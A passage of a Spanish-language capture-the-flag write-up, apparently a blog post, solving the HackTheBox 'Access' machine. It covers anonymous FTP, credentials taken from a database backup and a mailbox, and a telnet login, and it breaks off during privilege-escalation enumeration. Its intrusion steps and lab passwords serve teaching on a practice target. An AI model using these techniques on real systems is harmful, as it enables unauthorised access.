@@ -1,0 +1,1680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Access</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Access | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Access" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil, vamos a movernos con FTP, jugaremos con info de tablas de una base de datos Microsoft Access, comprimidos con contraseñas y correos (u.u) yyyy toquetearemos una instrucción que involucra al usuario Administrator con el binario runas.exe, esto para que ejecutemos lo que queramos como el propio admin." />
+<meta property="og:description" content="Máquina Windows nivel fácil, vamos a movernos con FTP, jugaremos con info de tablas de una base de datos Microsoft Access, comprimidos con contraseñas y correos (u.u) yyyy toquetearemos una instrucción que involucra al usuario Administrator con el binario runas.exe, esto para que ejecutemos lo que queramos como el propio admin." />
+<link rel="canonical" href="http://localhost:4000/htb/access" />
+<meta property="og:url" content="http://localhost:4000/htb/access" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-14T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156banner.png" />
+<meta property="twitter:title" content="HackTheBox - Access" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-14T00:00:00-07:00","datePublished":"2021-06-14T00:00:00-07:00","description":"Máquina Windows nivel fácil, vamos a movernos con FTP, jugaremos con info de tablas de una base de datos Microsoft Access, comprimidos con contraseñas y correos (u.u) yyyy toquetearemos una instrucción que involucra al usuario Administrator con el binario runas.exe, esto para que ejecutemos lo que queramos como el propio admin.","headline":"HackTheBox - Access","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/access"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/access"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Access</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-14">14 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156banner.png" alt="HackTheBox - Access">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Windows</strong> nivel fácil, vamos a movernos con <strong>FTP</strong>, jugaremos con info de tablas de una base de datos <strong>Microsoft Access</strong>, comprimidos con contraseñas y correos (u.u) yyyy toquetearemos una instrucción que involucra al usuario <strong>Administrator</strong> con el binario <strong>runas.exe</strong>, esto para que ejecutemos lo que queramos como el propio admin.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156accessHTB.png" alt="156accessHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/1190">egre55</a>.</p>
+
+<p>Inicialmente jugaremos con el servicio <strong>FTP</strong> para encontrar dos recursos: <code>Backups</code> y <code>Engineer</code>. En <code>Backups</code> tendremos un archivo <code>.mdb</code> (Microsoft Access DB), que usaremos para encontrar credenciales, posteriormente las usaremos para descomprimir un objeto encontrado en la carpeta <code>Engineer</code>, ese objeto tendrá un archivo <code>.pst</code>, de él obtendremos un mail con unas credenciales de un usuario llamado <strong>security</strong>, usaremos el servicio <strong>telnet</strong> para obtener una <strong>CMD</strong> como ese usuario en el sistema.</p>
+
+<p>Finalmente nos aprovecharemos de una instrucción que relaciona el binario <code>runas.exe</code> (ejecuta tareas como otros usuarios) con el usuario <strong>Administrator</strong> para llamar el binario <code>Access.exe</code>, jugueteando simplemente debemos modificar la ruta al binario que queremos que ejecute <code>runas.exe</code>.</p>
+
+<p>Así, generaremos un <strong>payload</strong> con ayuda de <code>msfvenom</code> para conseguir una <strong>Reverse Shell</strong> una vez sea ejecutado con <code>runas.exe</code> como el usuario <strong>Administrator</strong>.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Va queriendo ser R34L (pero le cuesta) con algo de jugueteo manual ;)</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Khe ze cuenta la jente¿ Pa none bamoz?</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#enum-nmap">Escaneos Nmap</a>.</li>
+      <li><a href="#puerto-21">Enumeración puerto 21 (FTP)</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#puerto-23">Acceso al sistema como el usuario <strong>security</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>…</p>
+
+<h3 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">⌖</a></h3>
+
+<p>Vamos a empezar con un escaneo de puertos apoyándonos de <strong>nmap</strong>, así vamos descubriendo por donde tirar:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.98 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Nos responde:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Thu Jun 10 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.98
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.98 ()  Status: Up
+Host: 10.10.10.98 ()  Ports: 21/open/tcp//ftp///, 23/open/tcp//telnet///, 80/open/tcp//http///  Ignored State: filtered (65532)
+# Nmap done at Thu Jun 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 197.46 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td style="text-align: left"><strong><a href="https://tecnonautas.net/que-es-el-puerto-tcp-21/">FTP</a></strong></td>
+    </tr>
+    <tr>
+      <td>23</td>
+      <td style="text-align: left"><strong><a href="https://www.profesionalreview.com/2019/01/20/telnet-que-es/">Telnet</a></strong></td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.98
+    [*] Open ports: 21,23,80
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<p>Ahora teniendo los puertos activos de la máquina, hagamos un escaneo de versiones y scripts conocidos para cada puerto, así podremos identificar cositas relevantes en cada uno:</p>
+
+<pre><code class="language-bash">❱ nmap -p 21,23,80 -sC -sV 10.10.10.98 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos responde:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Thu Jun 10 25:25:25 2021 as: nmap -p 21,23,80 -sC -sV -oN portScan 10.10.10.98
+Nmap scan report for 10.10.10.98
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
+| ftp-syst: 
+|_  SYST: Windows_NT
+23/tcp open  telnet?
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jun 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 184.58 seconds
+</code></pre>
+
+<p>Podemos destacar:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">21</td>
+      <td style="text-align: left">FTP</td>
+      <td style="text-align: left">Microsoft ftpd</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 7.5</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Además que tenemos acceso al servicio FTP con las credenciales <strong>anonymous</strong>.</li>
+</ul>
+
+<p>Pues nada, a explorar y romper esta machina :P</p>
+
+<p>…</p>
+
+<h3 id="puerto-21">Puerto 21 - FTP <a href="#puerto-21">⌖</a></h3>
+
+<p>En el escaneo de <strong>nmap</strong> nos percatamos que tenemos habilitado el <a href="https://www.viainternet.com.mx/clientes/index.php/knowledgebase/10/iComo-utilizo-el-FTP-Anonimo.html">acceso anónimo</a> al servidor <strong>FTP</strong>, pues entremos, colocamos como usuario y contraseña <code>anonymous</code>:</p>
+
+<pre><code class="language-bash">❱ ftp 10.10.10.98
+Connected to 10.10.10.98.
+220 Microsoft FTP Service
+Name (10.10.10.98:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.  
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; 
+</code></pre>
+
+<p>Listo, tamos dentro, recorramos a ver si hay algo interesante:</p>
+
+<pre><code class="language-bash">ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.  
+08-23-18  09:16PM       &lt;DIR&gt;          Backups
+08-24-18  10:00PM       &lt;DIR&gt;          Engineer
+226 Transfer complete.
+ftp&gt; 
+</code></pre>
+
+<p>Dos directorios, veamos <code>Backups</code> primero:</p>
+
+<pre><code class="language-bash">ftp&gt; cd Backups
+250 CWD command successful.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.  
+08-23-18  09:16PM              5652480 backup.mdb
+226 Transfer complete.
+ftp&gt; 
+</code></pre>
+
+<p>Encontramos un objeto <code>.mdb</code>, que <a href="https://www.reviversoft.com/es/file-extensions/mdb">investigando</a> se trata de un archivo de bases de datos <strong>Microsoft Access</strong>:</p>
+
+<blockquote>
+  <p>Estos archivos están clasificados como archivos de bases de datos, ya que en su mayoría contienen la estructura de bases de datos, las entradas y las formas, las consultas, los informes, la configuración de la seguridad de base de datos…</p>
+</blockquote>
+
+<p>Pues descarguémoslo a nuestro sistema y sigamos enumerando la otra carpeta:</p>
+
+<pre><code class="language-bash">ftp&gt; binary
+200 Type set to I.
+ftp&gt; get backup.mdb
+local: backup.mdb remote: backup.mdb
+200 PORT command successful.
+150 Opening BINARY mode data connection.
+226 Transfer complete.
+5652480 bytes received in 13.14 secs (419.9918 kB/s)  
+ftp&gt; 
+</code></pre>
+
+<pre><code class="language-bash">❱ file backup.mdb 
+backup.mdb: Microsoft Access Database
+</code></pre>
+
+<p>Bien, veamos <code>Engineer</code>:</p>
+
+<pre><code class="language-bash">ftp&gt; cd Engineer
+250 CWD command successful.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-24-18  01:16AM                10870 Access Control.zip
+226 Transfer complete.
+ftp&gt; 
+</code></pre>
+
+<p>Un archivo comprimido, descarguémoslo:</p>
+
+<pre><code class="language-bash">ftp&gt; get "Access Control.zip"
+</code></pre>
+
+<pre><code class="language-bash">❱ file Access\ Control.zip 
+Access Control.zip: Zip archive data, at least v2.0 to extract
+</code></pre>
+
+<p>…</p>
+
+<p>Pues juguemos con el archivo de bases de datos…</p>
+
+<p>Apoyándonos en una consulta web, <a href="https://superuser.com/questions/34326/opening-mdb-files-in-ubuntu">encontramos un foro</a> con algunos recursos para ver la data del archivo:</p>
+
+<ul>
+  <li><a href="https://superuser.com/questions/34326/opening-mdb-files-in-ubuntu#answer-1632462">DBeaver</a>.</li>
+  <li><a href="www.mdbopener.com">www.mdbopener.com</a>.</li>
+</ul>
+
+<p>Cualquiera de las dos nos viene bien, además que podemos complementarlas:</p>
+
+<p><strong>Usando la web</strong>:</p>
+
+<p>Cargamos el archivo, esperamos un rato y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_mdbopenerCom.png" alt="156google_mdbopenerCom" /></p>
+
+<p>Nótese a toda la derecha que hay muchas tablas :P Pero lo lindo de esta interfaz es que nos indica cuál de ellas tiene información dentro (<strong># Rows</strong>), así no tenemos que ir mirando una a una.</p>
+
+<p>Veamos rápidamente la otra alternativa:</p>
+
+<p><strong>Usando DBeaver</strong>:</p>
+
+<p>Despues de instalar el programa (siguiendo el foro, no es necesario ejecutar <code>apt install -f</code>) lo ejecutamos en segundo plano, así lo desligamos de la consola y evitamos que la use:</p>
+
+<pre><code class="language-bash">❱ (dbeaver &gt;&amp; /dev/null &amp;)
+</code></pre>
+
+<p>Está linda la herramienta porque podemos jugar con muchísimas bases de datos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_selection.png" alt="156bash_dbeaver_selection" /></p>
+
+<p>Encontramos la relacionada con <strong>Microsoft Access</strong>, la seleccionamos y nos pedirá un <code>path</code>, ahí le pasamos la ruta donde está el archivo <code>.mdb</code> y damos clic en <strong>Finalizar</strong>, deberíamos terminar en esta ventana:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_laststep.png" alt="156bash_dbeaver_laststep" /></p>
+
+<p>Ahora damos clic donde señale, pueda que les pida algo de descargar, si si, pues le dan a descargar 🥳 y si no pues supongo que todo ira bien u.u 😱</p>
+
+<p>Finalmente deberíamos tener esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_backupMDB.png" alt="156bash_dbeaver_backupMDB" /></p>
+
+<p>Y listo, veríamos todas las tablas, pero pues deberíamos ir una a una viendo cuál tiene data, lo cual está aburrido :P Peeeero en esta interfaz podemos agregar consultas <strong>SQL</strong>, por eso digo que se complementan, en una vamos directamente a donde hay información y en la otra filtramos esa información en caso de ser necesario. Así que las dos herramientas están guapetonas.</p>
+
+<p>Explorando las tablas encontramos algunas llamativas…</p>
+
+<p><strong>USERINFO</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_mdbonline_USERINFOtable.png" alt="156google_mdbonline_USERINFOtable" /></p>
+
+<p>Que en su contenido tiene varios campos, pero filtrando por los destacables tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_USERINFOtable_query.png" alt="156bash_dbeaver_USERINFOtable_query" /></p>
+
+<p>Unos “usuarios” (son nombres, pero podemos pensar en ellos como usuarios también) con contraseñas…</p>
+
+<p><strong>auth user</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_mdbonline_AUTHUSERtable.png" alt="156google_mdbonline_AUTHUSERtable" /></p>
+
+<p>Encontramos otras credenciales, pero esta vez más directas e.e Tenemos usuarios y contraseñas, aunque una destaca (al ser distinta de las otras) ¿cuál será? e.e 😬</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Tenemos unas credenciales, guardémoslas y terminemos de enumerar lo obtenido del servidor <strong>FTP</strong>, veamos el comprimido:</p>
+
+<pre><code class="language-bash">❱ unzip Access\ Control.zip 
+Archive:  Access Control.zip
+   skipping: Access Control.pst      unsupported compression method 99
+</code></pre>
+
+<p>Jmmm, nos muestra que tiene contenido (un archivo <code>.pst</code>) pero no nos deja obtenerlo, validemos con la herramienta <strong>7z</strong> ((de)compresor universal) si es necesaria una contraseña para descomprimir el objeto:</p>
+
+<pre><code class="language-bash">❱ 7z x Access\ Control.zip 
+...
+Enter password (will not be echoed):
+ERROR: Wrong password : Access Control.pst  
+...
+Sub items Errors: 1
+</code></pre>
+
+<p>Y si, ese es el error, nos pide contraseña. Pues aprovechando que tenemos credenciales probémoslas contra el comprimido…</p>
+
+<p>Probando la que habíamos dicho que era distinta a las demás (<code>access4u@security</code>) conseguimos descomprimir el objeto sin problemas:</p>
+
+<pre><code class="language-bash">❱ 7z x Access\ Control.zip 
+...
+Enter password (will not be echoed):  
+Everything is Ok         
+
+Size:       271360
+Compressed: 10870
+</code></pre>
+
+<p>Bien, obtenemos el archivo <code>.pst</code>:</p>
+
+<pre><code class="language-bash">❱ file Access\ Control.pst 
+Access Control.pst: Microsoft Outlook email folder (&gt;=2003)
+</code></pre>
+
+<p>Un objeto <a href="https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790">.pst</a> objeto que contiene mensajes y otros items relacionados con <strong>Outlook</strong>, pero para poder leer ese objeto es necesario convertirlo a formato “readable”, usaremos <a href="https://linux.die.net/man/1/readpst">readpst</a> para ese propósito:</p>
+
+<pre><code class="language-bash">❱ readpst Access\ Control.pst 
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+        "Access Control" - 2 items done, 0 items skipped.
+</code></pre>
+
+<p>El archivo contiene el directorio <strong>Deleted Items</strong> y ha recuperado <strong>2</strong> items de él, esa información la guarda en un archivo <code>.mbox</code> con formato entendible:</p>
+
+<pre><code class="language-bash">❱ ls
+'Access Control.mbox'  'Access Control.pst'  'Access Control.zip'   backup.mdb
+</code></pre>
+
+<p>Viendo su contenido encontramos:</p>
+
+<pre><code class="language-bash">❱ cat Access\ Control.mbox
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_mboxfile.png" alt="156bash_mboxfile" /></p>
+
+<p>Opa, varias cositas destacadas:</p>
+
+<ul>
+  <li><code>john@megacorp.com</code>, un usuario (<code>john</code>, que lo habíamos visto antes) y un dominio (que no creo que sea relevante, ya que es <code>.com</code>).</li>
+  <li><code>security@accesscontrolsystems.com</code>, otro usuario y otro dominio extraño.</li>
+  <li>Nos confirman una cuenta llamada <strong>security</strong> y una contraseña asignada a ella:
+    <ul>
+      <li><code>4Cc3ssC0ntr0ller</code>.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Bien, pues varias credenciales para probar 🏜️</p>
+
+<p>…</p>
+
+<h3 id="puerto-23">Puerto 23 - Telnet <a href="#puerto-23">⌖</a></h3>
+
+<p>El servicio <a href="https://www.profesionalreview.com/2019/01/20/telnet-que-es/">telnet</a> nos ayuda a establecer conexiones remotas con otros ordenadores, así de sencillo, algo así como <strong>SSH</strong>, pero telnet es inseguro :P</p>
+
+<p>Usando la herramienta <code>telnet</code> podemos empezar a jugar:</p>
+
+<pre><code class="language-bash">❱ telnet 10.10.10.98
+...
+Welcome to Microsoft Telnet Service 
+
+login: admin
+password: 
+The handle is invalid.
+
+Login Failed
+</code></pre>
+
+<p>Efectivamente nos pide unas credenciales, pues probando las que conseguimos del correo obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_telnet_securitySH.png" alt="156bash_telnet_securitySH" /></p>
+
+<p>Peeeeeeeeeerrrrrrrrrrrrfecto, estamos dentro del sistema como el usuario <strong>security</strong> :o</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_gif_grandpaDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;" /></p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Enumerando el sistema encontramos una carpeta llamada <code>ZKTeco</code>, que usualmente no la vemos en un sistema <strong>Windows</strong>, así que es llamativa:</p>
+
+<pre><code class="language-powershell">c:\&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of c:\
+
+08/23/2018  11:05 PM    &lt;DIR&gt;          inetpub
+07/14/2009  04:20 AM    &lt;DIR&gt;          PerfLogs
+08/23/2018  09:53 PM    &lt;DIR&gt;          Program Files
+08/24/2018  08:40 PM    &lt;DIR&gt;          Program Files (x86)
+08/24/2018  08:39 PM    &lt;DIR&gt;          temp
+08/21/2018  11:31 PM    &lt;DIR&gt;          Users
+08/23/2018  11:40 PM    &lt;DIR&gt;          Windows
+08/22/2018  08:23 AM    &lt;DIR&gt;          ZKTeco
+               0 File(s)              0 bytes
+               8 Dir(s)  16,771,743,744 bytes free
+
+c:\&gt;
+</code></pre>
+
+<pre><code class="language-powershell">c:\&gt;dir ZKTeco
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of c:\ZKTeco
+
+08/22/2018  08:23 AM    &lt;DIR&gt;          .
+08/22/2018  08:23 AM    &lt;DIR&gt;          ..
+06/11/2021  04:40 PM    &lt;DIR&gt;          ZKAccess3.5
+               0 File(s)              0 bytes
+               3 Dir(s)  16,771,743,744 bytes free
+
+c:\&gt;
+</code></pre>
+
+<p>Al parecer contiene un software llamado <strong><a href="https://www.zktecolatinoamerica.com/software/zkaccess-3-5/">ZKAccess3.5</a></strong>, que sirve para administrar el control de acceso al sistema…</p>
+
+<p>Dentro del directorio hay varios archivos, pero ninguno interesante ): Buscando vulnerabilidades relacionadas, encontramos <a href="https://www.exploit-db.com/exploits/40323">esta</a>, pero no es funcional ☹️</p>
+
+<p>Despues de enumerar más a fondo, encontramos un archivo relacionado con el servicio <strong>ZKAccess</strong> en el directorio <code>C:\Users\Public\Desktop</code>:</p>
+
+<p><strong>(Debemos listar todo, hasta archivos ocultos)</strong></p>
+
+<p>Normal:</p>
+
+<pre><code class="language-powershell">c:\Users\Public&gt;dir 
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of c:\Users\Public
+
+07/14/2009  05:57 AM    &lt;DIR&gt;          .
+07/14/2009  05:57 AM    &lt;DIR&gt;          ..
+07/14/2009  06:06 AM    &lt;DIR&gt;          Documents
+07/14/2009  05:57 AM    &lt;DIR&gt;          Downloads
+07/14/2009  05:57 AM    &lt;DIR&gt;          Music
+07/14/2009  05:57 AM    &lt;DIR&gt;          Pictures
+07/14/2009  05:57 AM    &lt;DIR&gt;          Videos
+               0 File(s)              0 bytes
+               7 Dir(s)  16,771,743,744 bytes free
+
+c:\Users\Public&gt;
+</code></pre>
+
+<p>Normal más ocultos:</p>
+
+<pre><code class="language-powershell">c:\Users\Public&gt;dir /a
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of c:\Users\Public
+
+07/14/2009  05:57 AM    &lt;DIR&gt;          .
+07/14/2009  05:57 AM    &lt;DIR&gt;          ..
+08/28/2018  07:51 AM    &lt;DIR&gt;          Desktop
+07/14/2009  05:57 AM               174 desktop.ini
+07/14/2009  06:06 AM    &lt;DIR&gt;          Documents
+07/14/2009  05:57 AM    &lt;DIR&gt;          Downloads
+07/14/2009  03:34 AM    &lt;DIR&gt;          Favorites
+07/14/2009  05:57 AM    &lt;DIR&gt;          Libraries
+07/14/2009  05:57 AM    &lt;DIR&gt;          Music
+07/14/2009  05:57 AM    &lt;DIR&gt;          Pictures
+07/14/2009  05:57 AM    &lt;DIR&gt;          Videos
+               1 File(s)            174 bytes
+              10 Dir(s)  16,771,743,744 bytes free
+
+c:\Users\Public&gt;
+</code></pre>
+
+<p>Y en el directorio <code>Desktop</code> tenemos:</p>
+
+<pre><code class="language-powershell">c:\Users\Public&gt;cd Desktop
+
+c:\Users\Public\Desktop&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of c:\Users\Public\Desktop
+
+08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
+               1 File(s)          1,870 bytes
+               0 Dir(s)  16,771,743,744 bytes free
+
+c:\Users\Public\Desktop&gt;
+</code></pre>
+
+<p>Veamos su contenido:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156win_typelnkFILE.png" alt="156win_typelnkFILE" /></p>
+
